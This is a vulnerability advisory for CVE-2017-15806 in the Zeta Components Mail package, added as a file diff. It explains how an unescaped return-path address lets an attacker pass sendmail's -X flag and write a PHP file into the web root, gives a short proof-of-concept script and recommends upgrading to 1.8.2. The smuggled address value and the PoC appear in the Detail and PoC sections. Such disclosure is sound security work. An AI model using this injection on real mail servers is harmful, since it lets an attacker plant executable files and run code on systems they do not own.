@@ -1,0 +1,49 @@
+Vendor: Zeta Components
+
+module: Mail, <= 1.8.1
+
+Published: November 12nd, 2017
+
+Reported by: Kay
+
+CVE-2017-15806
+
+Overview
+
+Zeta Components are a high quality, general purpose library of loosly coupled components for development of applications based on PHP 5. An issue was discovered in the Mail package for Zeta Components. It’s possible to exploit this vulnerability to execute arbitrary shell commands on the remote server.
+
+Detail
+
+This vulnerability is on send method in ezcMailMtaTransport class.
+
+In /src/transports/mta/mta_transport.php at line 73, send() method use PHP mail() method to deliver email, while PHP use sendmail as default MTA. When mail() method is called, the 5th parameter is $additionalParameters , this parameter can pass extra param to sendmail. As the code shown, it is assigned by this line:
+
+$additionalParameters = "-f{$mail->returnPath->email}”;
+
+If attacker assign email address like:
+
+'kay_malwarebenchmark@outlook.com -X/var/www/html/cache/exploit.php'
+
+and inject payload in mail body, sendmail will transfer log(-X) into /var/www/html/cache/exploit.php. The resulting file will contain the payload passed in the body of the email, that can then be accessed and run through domainname/cache/exploit.php.
+
+To summary, it is possible if all of these conditions are true:
+
+- you use the ezcMailMtaTransport
+- your “sendmail” binary allows the -X flag to be set, which is not the case for exim4 and postfix, as they don’t support that argument
+- your wwwroot is writable by the user your webserver is running at the input to use for the ezcMailAddress that is assigned to the returnPath property is not properly escaped
+
+PoC
+
+ use Mail\mail;
+
+ $mail = new ezcMail();
+ $mail->returnPath = new ezcMailAddress('kay_malwarebenchmark@outlook.com -X/var/www/html/cache/exploit.php');
+ $mail->addTo( new ezcMailAddress('some one'));
+ $mail->subject = "Mail PoC Exploit";
+ $mail->body = new ezcMailText("<?php phpinfo(); ?>");
+ $transport = new ezcMailMtaTransport();
+ $transport->send($mail);
+
+Remediation
+
+Upgrade Mail to 1.8.2
